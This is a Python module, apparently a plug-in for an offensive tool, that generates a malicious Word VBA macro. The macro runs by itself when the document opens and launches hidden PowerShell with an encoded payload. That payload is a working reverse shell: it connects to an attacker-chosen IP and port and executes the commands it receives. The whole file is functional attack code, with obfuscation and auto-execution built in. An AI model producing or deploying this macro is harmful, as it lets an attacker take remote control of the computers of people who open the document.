# === File: macros/reverse_shell.py ===

import base64

metadata = {
    "name": "ReverseShell",
    "description": "Executes a Base64-encoded PowerShell reverse shell.",
    "parameters": ["ip", "port"]
}

def split_vba_string(s, max_len=200):
    lines = [s[i:i+max_len] for i in range(0, len(s), max_len)]
    return '" & _\n          "'.join(lines)

def generate_macro_code(params):
    ip = params["ip"]
    port = params["port"]
    ps_code = (
        "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};"
        "$client.Close()"
    ).format(ip=ip, port=port)

    encoded = base64.b64encode(ps_code.encode('utf-16le')).decode()
    split_payload = split_vba_string(encoded)

    return f'''
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell -nop -w hidden -noni -ep bypass -enc " & _
          "{split_payload}"
    Shell str, vbHide
End Sub
'''
